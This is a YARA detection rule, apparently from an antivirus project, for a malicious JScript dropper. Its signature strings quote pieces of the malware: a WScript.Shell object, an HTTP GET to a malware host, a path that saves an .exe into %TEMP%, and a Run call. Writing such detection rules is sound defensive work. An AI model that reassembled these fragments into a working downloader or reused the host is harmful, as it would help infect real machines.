rule sig_20160328_0db5e033c8f60c55a76b4562cafe72bc {
  meta:
    description = "datamaliciousorder - file 20160328_0db5e033c8f60c55a76b4562cafe72bc.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "b0e45adebaf28fabbaf228ef51d728b3b20edb5d8365431f534c85ef536f79be"

  strings:
    $s1  = "function Wwlqrlivc() {return Kjjup[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"Em7LMsft1F.exe\";};" fullword ascii
    $s2  = "Wiyatsyl[Rrmzamikf](\"GET\", \"http://2biking.com/k4isfa\", false);" fullword ascii
    $s3  = "do {WScript[Bowvbyis](Xksjaogf() * 11)} while (Wiyatsyl[\"readystate\"] < 4 );" fullword ascii
    $s4  = "function Pbuqzatx(Uexqfkxejd, Uqokxxptv){return Uexqfkxejd - Uqokxxptv;};" fullword ascii
    $s5  = "var Kjjup = function Ccfhzqgxvt() {return WScript[Thcov](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Kmcxhac() {return ((Qgjfe == true) && (Qgjfe == Jtjotdvmry)) ? 1 : Dtync;};" fullword ascii
    $s7  = "function Ggwkronl(Ecjzcpwy){Kjjup[\"Run\"](Ecjzcpwy, Dtync, Dtync);};" fullword ascii
    $s8  = "var Cojppfpv = false;" fullword ascii
    $s9  = "Jtjotdvmry = true; " fullword ascii
    $s10 = "function Ieqhj(Bvvxthoxec) {var Glmxnrv = (1, 2, 3, 4, 5, Bvvxthoxec); return Glmxnrv;};" fullword ascii
    $s11 = "var Qgjfe = false;" fullword ascii
    $s12 = "function Ockzjgl()" fullword ascii
    $s13 = "var Jtjotdvmry = false;" fullword ascii
    $s14 = " while (Pctol){" fullword ascii
    $s15 = "return Pbuqzatx(Gyyvnp, Kjfmk);" fullword ascii
    $s16 = "var Ggyuzfwwgp = new this[\"Date\"]();" fullword ascii
    $s17 = "Qgjfe = true; " fullword ascii
    $s18 = "function Hqthwgveo(){return Thcov;};" fullword ascii
    $s19 = "function Xksjaogf(){return 22;};" fullword ascii
    $s20 = "function Mvuegx(){return Mqwpzzy;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}